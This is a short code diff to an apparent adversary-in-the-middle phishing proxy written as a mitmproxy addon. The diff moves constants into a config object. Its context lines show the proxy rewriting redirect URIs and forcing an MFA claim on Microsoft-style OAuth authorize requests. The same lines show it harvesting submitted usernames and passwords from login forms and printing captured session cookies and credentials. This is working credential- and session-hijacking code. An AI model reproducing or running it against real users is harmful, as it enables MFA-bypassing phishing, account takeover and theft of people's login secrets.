@@ -8,7 +8,7 @@ from http.cookies import SimpleCookie
 
 from mitmproxy.http import HTTPFlow
 
-from aitm.aitm_config import AUTH_URL, MFA_CLAIM
+from aitm.aitm_config import config
 from aitm.helpers import cookies, requests, responses
 
 logger = logging.getLogger(__name__)
@@ -33,7 +33,7 @@ class ModifierAddon:
         requests.modify_query(flow, "redirect_uri")
 
         if flow.request.path.startswith("/common/oauth2/v2.0/authorize"):
-            flow.request.query["claims"] = MFA_CLAIM
+            flow.request.query["claims"] = config.mfa_claim
         if flow.request.path.startswith("/common/login"):
             self.credentials["login"] = flow.request.urlencoded_form["login"]
             self.credentials["passwd"] = flow.request.urlencoded_form["passwd"]
@@ -47,6 +47,6 @@ class ModifierAddon:
         responses.modify_cookies(flow)
         responses.modify_content(flow)
 
-        if flow.request.path in AUTH_URL:
+        if flow.request.path in config.auth_url:
             print(json.dumps(cookies.parse_cookies(self.simple_cookie)))
             print(self.credentials)
